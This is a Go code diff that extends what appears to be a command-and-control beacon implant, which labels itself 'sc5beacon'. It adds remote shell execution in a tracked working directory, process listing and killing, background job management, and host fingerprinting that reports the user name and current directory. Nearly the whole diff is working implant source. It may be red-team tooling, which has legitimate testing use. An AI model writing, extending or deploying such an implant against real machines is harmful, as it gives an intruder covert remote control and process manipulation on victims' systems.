@@ -10,6 +10,8 @@ import (
 	"strings"
 )
 
+var jobs = newJobManager()
+
 func runTask(cmd string, args map[string]any) string {
 	cmd = strings.TrimSpace(cmd)
 	if strings.HasPrefix(cmd, "file:") {
@@ -34,20 +36,94 @@ func runTask(cmd string, args map[string]any) string {
 		return handleBofRun(args)
 	}
 	if cmd == "sysinfo" {
-		return fmt.Sprintf("os=%s arch=%s hostname=%s", runtime.GOOS, runtime.GOARCH, hostName())
+		return fmt.Sprintf(
+			"os=%s arch=%s hostname=%s user=%s cwd=%s agent=sc5beacon ver=3.0.0",
+			runtime.GOOS, runtime.GOARCH, hostName(), envUser(), jobs.getCwd(),
+		)
 	}
-	// default: shell
+	if cmd == "pwd" {
+		return jobs.getCwd()
+	}
+	if cmd == "cd" {
+		path, _ := args["path"].(string)
+		if path == "" {
+			path, _ = args["dir"].(string)
+		}
+		if path == "" && len(args) == 0 {
+			// allow "cd /tmp" as shell-style in command — handled below
+		}
+		return jobs.setCwd(path)
+	}
+	if strings.HasPrefix(cmd, "cd ") {
+		return jobs.setCwd(strings.TrimSpace(cmd[3:]))
+	}
+	if cmd == "ps" || cmd == "processes" {
+		return listProcesses()
+	}
+	if cmd == "kill" || strings.HasPrefix(cmd, "kill ") {
+		pid := anyToInt(args["pid"])
+		if pid == 0 && strings.HasPrefix(cmd, "kill ") {
+			pid = anyToInt(strings.TrimSpace(cmd[5:]))
+		}
+		return killPID(pid)
+	}
+	if cmd == "job:list" || cmd == "jobs" {
+		return jobs.list()
+	}
+	if cmd == "job:get" {
+		id, _ := args["id"].(string)
+		if id == "" {
+			id, _ = args["job_id"].(string)
+		}
+		return jobs.get(id)
+	}
+	if cmd == "job:kill" {
+		id, _ := args["id"].(string)
+		if id == "" {
+			id, _ = args["job_id"].(string)
+		}
+		return jobs.kill(id)
+	}
+	if cmd == "job:start" || cmd == "async" {
+		c, _ := args["command"].(string)
+		if c == "" {
+			c, _ = args["cmd"].(string)
+		}
+		if c == "" {
+			return "error: command required"
+		}
+		return jobs.start(c)
+	}
+	// args.async == true → background job
+	if asyncFlag(args) {
+		return jobs.start(cmd)
+	}
+	// default: shell in job cwd
 	var c *exec.Cmd
 	if runtime.GOOS == "windows" {
 		c = exec.Command("cmd", "/C", cmd)
 	} else {
 		c = exec.Command("sh", "-c", cmd)
 	}
+	c.Dir = jobs.getCwd()
 	out, err := c.CombinedOutput()
 	if err != nil {
 		return string(out) + "\n" + err.Error()
 	}
 	return string(out)
+}
+
+func asyncFlag(args map[string]any) bool {
+	if args == nil {
+		return false
+	}
+	if v, ok := args["async"].(bool); ok && v {
+		return true
+	}
+	if v, ok := args["async"].(string); ok && (v == "1" || strings.EqualFold(v, "true")) {
+		return true
+	}
+	return false
 }
 
 func runFileOp(cmd string, args map[string]any) string {
@@ -59,7 +135,7 @@ func runFileOp(cmd string, args map[string]any) string {
 	switch op {
 	case "list":
 		if path == "" {
-			path = "."
+			path = jobs.getCwd()
 		}
 		entries, err := os.ReadDir(path)
 		if err != nil {
@@ -84,7 +160,6 @@ func runFileOp(cmd string, args map[string]any) string {
 		if err != nil {
 			return err.Error()
 		}
-		// optional chunking
 		off := 0
 		if v, ok := args["offset"].(float64); ok {
 			off = int(v)
@@ -137,3 +212,13 @@ func hostName() string {
 	h, _ := os.Hostname()
 	return h
 }
+
+func envUser() string {
+	u := os.Getenv("USER")
+	if u == "" {
+		u = os.Getenv("USERNAME")
+	}
+	return u
+}
+
+func getenv(k string) string { return os.Getenv(k) }
